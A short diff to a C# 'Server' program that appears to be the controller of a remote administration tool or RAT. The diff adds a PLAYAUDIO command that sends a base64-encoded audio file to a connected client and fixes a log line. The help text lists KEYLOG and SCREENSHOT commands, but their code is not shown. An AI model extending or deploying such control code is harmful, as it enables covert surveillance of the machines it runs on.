@@ -112,7 +112,9 @@ namespace Server
                     Console.WriteLine("KEYLOG");
                     Console.WriteLine("DISCONNECT");
                     Console.WriteLine("SCREENSHOT");
-                    Console.WriteLine("OPENSITE");
+                    Console.WriteLine("OPENSITE [www.yoursite.com]");
+                    Console.WriteLine("PLAYAUDIO [PCMWaveFile]");
+
                 }
                 else if (Command[0] == "KEYLOG")
                 {
@@ -136,7 +138,15 @@ namespace Server
                 {
                     byte[] msg = Encoding.ASCII.GetBytes("OPENSITE|" + Command[1]);
                     SendData(stream, msg);
-                    Console.WriteLine("Sent: {0}", "DISCONNECT");
+                    Console.WriteLine("Sent: {0}", Command[0]);
+                }
+                else if (Command[0] == "PLAYAUDIO")
+                {
+                    byte[] audioBytes = File.ReadAllBytes(Directory.GetCurrentDirectory() + "/" + Command[1]);
+                    string base64String = Convert.ToBase64String(audioBytes);
+                    byte[] msg = Encoding.ASCII.GetBytes("PLAYAUDIO|" + base64String);
+                    SendData(stream, msg);
+                    Console.WriteLine("Sent: {0}", Command[0]);
                 }
                 else
                 {
